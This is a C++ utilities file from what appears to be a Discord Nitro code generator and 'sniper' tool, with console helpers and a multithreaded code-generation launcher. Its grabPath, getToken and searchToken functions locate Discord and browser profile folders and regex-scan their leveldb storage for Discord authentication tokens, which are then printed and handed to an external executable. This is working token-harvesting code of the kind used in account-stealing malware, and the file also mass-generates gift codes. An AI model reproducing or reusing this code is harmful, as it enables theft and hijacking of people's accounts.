#include "utilities.hpp"

void slowType(std::string input) {
	for (char ch : input) {
		std::cout << ch << std::flush;
		Sleep(1);
	}
}

void changeColor(int col) {
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), col);
	/*
	Color Key
	1 - Dark blue
	2 - Dark green
	3 - Dark aqua
	4 - Dark red
	5 - Dark purple
	6 - Dark yellow
	7 - Dark white
	8 - Grey
	9 - Blue
	10 - Green
	11 - Aqua
	12 - Red
	13 - Purple
	14 - Yellow
	15 - White
	16 - 25 - Blue background, don't use
	*/
}

std::string getId(std::string str) {
	std::string token = str.substr(25, 16);
	return token;
}

void multiThread(int instances) {
	std::vector<std::thread> threads;
	// safety checking
	if (instances > 1000000) {
		slowType("That's way too many threads!");
		return;
	}
	if (instances <= 0) {
		slowType("You can't have less than one thread");
		return;
	}
	if (instances > 50) {
		slowType("You have entered a very high amount of threads, which may cause freezing. Are you sure you want to continue? [Y/N] ");
		char inp;
		std::cin >> inp;
		if (inp == 'n' || inp == 'N') return;
	}
	for (int i = 0; i < instances; i++) {
		threads.push_back(std::thread(codes::threadFriendlyGenerateCodes, "NitroCodes.txt"));
	}
	for (int i = 0; i < instances; i++) {
		threads[i].join();
	}
}

std::vector<std::string> grabPath() {
	using namespace std;
	vector<string> targetLocations;

	char* roaming;
	size_t len;
	_dupenv_s(&roaming, &len, "APPDATA");

	char* local;
	size_t len2;
	_dupenv_s(&local, &len2, "LOCALAPPDATA");

	string Discord = string(roaming) + "\\Discord";
	string DiscordCanary = string(roaming) + "\\discordcanary";
	string DiscordPTB = string(roaming) + "\\discordptb";
	string Opera = string(roaming) + "\\Opera Software\\Opera Stable";
	string Chrome = string(local) + "\\Google\\Chrome\\UserData\\Default";
	string Brave = string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default";
	string Yandex = string(local) + "\\Yandex\\YandexBrowser\\User Data\\Default";

	targetLocations.push_back(Discord);
	targetLocations.push_back(DiscordCanary);
	targetLocations.push_back(DiscordPTB);
	targetLocations.push_back(Opera);
	targetLocations.push_back(Chrome);
	targetLocations.push_back(Brave);
	targetLocations.push_back(Yandex);

	free(local);
	free(roaming);

	return targetLocations;
}

bool pathExist(const std::string& s) {
	struct stat buffer;
	return (stat(s.c_str(), &buffer) == 0);
}

bool hasEnding(std::string const& fullString, std::string const& ending) {
	using namespace std;
	if (fullString.length() > ending.length()) {
		return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
	}
	else {
		return false;
	}
}

std::vector<std::string> findMatch(std::string str, std::regex reg) {
	using namespace std;
	vector<string> output;
	sregex_iterator currentMatch(str.begin(), str.end(), reg);
	sregex_iterator lastMatch;

	while (currentMatch != lastMatch) {
		smatch match = *currentMatch;
		output.push_back(match.str());
		currentMatch++;
	}

	return output;
};

void searchToken(const std::string& loc) {
	using namespace std;
	ifstream ifs(loc, ios_base::binary);
	string content((istreambuf_iterator<char>(ifs)), (istreambuf_iterator<char>()));

	vector <string> master;

	regex reg1("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
	regex reg2("mfa\\.[\\w-]{84}");

	vector<string> check = findMatch(content, reg1);
	vector<string> check2 = findMatch(content, reg2);

	for (int i = 0; i < check.size(); i++) {
		master.push_back(check[i]);
	}
	for (int i = 0; i < check2.size(); i++) {
		master.push_back(check2[i]);
	}

	for (int i = 0; i < master.size(); i++) {
		string tok = master[i];
		const char* token = tok.c_str();
		cout << "Your token is: " << token << endl;
	}
}

void getToken(const std::string& path) {
	using namespace std;
	namespace fs = std::filesystem;
	string target = path + "\\Local Storage\\leveldb";

	for (const auto& entry : fs::directory_iterator(target)) {
		string strPath = entry.path().u8string();
		if (hasEnding(strPath, ".log")) {
			searchToken(strPath);
		}

		if (hasEnding(strPath, ".ldb")) {
			searchToken(strPath);
		}
	}
}

std::wstring getCurrDir() {
	std::filesystem::path cwd = std::filesystem::current_path();
	return cwd;
}

void nitroSnipe(LPCSTR token) {
	ShellExecuteA(NULL, "open", "NitroSnipe.exe", token, NULL, SW_SHOW);
}